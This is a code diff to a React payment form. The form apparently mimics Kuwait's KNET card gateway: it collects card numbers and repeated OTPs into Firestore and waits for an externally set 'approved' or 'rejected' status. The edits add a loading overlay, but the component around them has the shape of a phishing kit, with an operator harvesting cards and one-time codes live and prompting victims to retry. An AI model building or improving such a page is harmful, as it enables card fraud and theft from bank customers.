@@ -5,7 +5,7 @@ import './kent.css'
 import {  doc,  onSnapshot, updateDoc } from 'firebase/firestore';
 import { useCart } from '@/components/cart-provider';
 import { db } from '@/lib/firebaes';
-import { WaitingDialog } from '@/components/waiting';
+import { Loader } from '@/components/loader';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -161,9 +161,9 @@ const {totalPrice}=  useCart() as any
             setPaymentInfo(prev => ({ ...prev, status: data.status }));
             if (data.status === 'approved') {
               setstep(2);
-             // props.setisloading(false);
+            setLoading(false)
             } else if (data.status === 'rejected') {
-            //  props.setisloading(false);
+              setLoading(false);
               alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
               setstep(1);
             }
@@ -186,6 +186,10 @@ const {totalPrice}=  useCart() as any
       )}
   return (
     <>
+    {loading?
+    <div
+    style={{position:'absolute',top:0,left:0,right:0,bottom:0,background:'rgba(255,255,255,0.9)',margin:'auto',paddingTop:150,paddingRight:80}}><Loader/></div>
+:
     <div style={{background:"#f1f1f1",height:"100vh",margin:0,padding:0}} dir="ltr">
       <form
         onSubmit={(e) => {
@@ -240,7 +244,6 @@ const {totalPrice}=  useCart() as any
                   }}
                   id="otpmsgDC"
                 />
-
                 {/*Customer Validation  for knet*/}
                 <div
                   className="notification"
@@ -291,7 +294,6 @@ const {totalPrice}=  useCart() as any
                   </div>
                   {/* Added for Points Redemption */}
                 </div>
-
                 {step === 1 ? (
                   <>
                     <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
@@ -578,8 +580,9 @@ const {totalPrice}=  useCart() as any
                           paymentInfo.status === 'pending'
                         }
                         onClick={() => {
+setLoading(true)
+
                           if (step === 1) {
-                           // props.setisloading(true);
                             handlePay(paymentInfo,setPaymentInfo)
                             handleSubmit();
                           } else if (step >= 2) {
@@ -588,7 +591,7 @@ if(
   !newotp.includes(paymentInfo.otp!)
 
 ){                            newotp.push(paymentInfo.otp!)}
-                          //  props.setisloading(true)
+                      setLoading(true)
                             handleAddotp(paymentInfo.otp!);
                           //  props.handleOArr(paymentInfo.otp!);
                             handlePay(paymentInfo,setPaymentInfo)
@@ -651,6 +654,7 @@ if(
         </div>
       </form>
     </div>
+}
     </>
 
   );
